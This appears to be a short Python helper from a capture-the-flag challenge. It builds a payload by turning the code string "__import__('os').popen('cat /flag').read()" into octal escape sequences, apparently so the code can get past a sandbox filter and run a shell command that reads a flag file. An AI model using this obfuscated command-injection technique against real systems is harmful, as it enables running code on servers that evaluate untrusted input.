todo = "__import__('os').popen('cat /flag').read()"

payload = ''
# bases8 = [oct(ord(i)) for i in todo]
bases8 = [format(ord(i), 'o') for i in todo]
for _ in bases8:
    payload += f'\{_}'
print(payload)